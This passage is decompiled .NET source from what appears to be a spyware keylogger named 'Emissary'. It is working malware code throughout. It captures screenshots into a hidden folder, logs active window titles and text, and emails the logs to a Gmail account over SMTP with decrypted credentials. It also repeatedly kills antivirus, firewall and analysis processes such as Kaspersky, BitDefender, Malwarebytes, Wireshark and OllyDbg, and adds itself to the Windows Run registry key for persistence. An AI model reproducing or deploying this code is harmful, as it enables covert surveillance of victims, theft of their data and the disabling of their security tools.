		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		if (!Directory.Exists("C:\\Documents And Settings\\All Users\\Application Data\\Sys32"))
		{
			Directory.CreateDirectory("C:\\Documents And Settings\\All Users\\Application Data\\Sys32");
			DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Documents And Settings\\All Users\\Application Data\\Sys32");
			directoryInfo.Attributes = FileAttributes.Hidden;
		}
		try
		{
			((Form)this).set_Opacity(0.0);
			Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
			((Image)val).Save("C:\\Documents And Settings\\All Users\\Application Data\\Sys32\\Screenshot" + ssn + ".jpeg");
			((Form)this).set_Opacity(100.0);
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name() + " : Emissary Logs";
			mailMessage.To.Add(des.Decrypt(TextBox2.get_Text()));
			mailMessage.From = new MailAddress(des.Decrypt(TextBox2.get_Text()));
			Attachment item = new Attachment("C:\\Documents and Settings\\All Users\\Application Data\\Sys32\\Screenshot" + ssn + ".jpeg");
			mailMessage.Attachments.Add(item);
			mailMessage.Body = TextBox1.get_Text();
			SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
			smtpClient.Port = 587;
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(des.Decrypt(TextBox2.get_Text()), des.Decrypt(TextBox3.get_Text()));
			smtpClient.Send(mailMessage);
			((TextBoxBase)TextBox1).Clear();
			FileSystem.Kill("C:\\Documents and Settings\\All Users\\Application Data\\Sys32\\Screenshot" + ssn + ".jpeg");
			ssn = Conversions.ToString(Conversions.ToDouble(ssn) + 1.0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void fic77e23knasdf()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(strin, GetActiveWindowTitle(), false) != 0)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n[" + GetActiveWindowTitle() + "]:\r\n");
			strin = GetActiveWindowTitle();
		}
	}

	public void AntiKeyscrambler()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "keyscrambler", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiWireshark()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "wireshark", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiAnubis()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "anubis", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiMalwarebytes()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "mbam", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiKaspersky()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "avp", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiOllydbg()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ollydbg", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiOutpost()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "outpost", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiNorman()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "npfmsg", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiBitDefender()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "bdagent", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void AntiNOD32()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "egui", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AddStartup(string Name, string Path)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(Name, Path, RegistryValueKind.String);
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		AntiAnubis();
		AntiBitDefender();
		AntiKaspersky();
		AntiKeyscrambler();
		AntiMalwarebytes();
		AntiNOD32();
		AntiNorman();
		AntiOllydbg();
		AntiOutpost();
		AntiWireshark();
	}
}
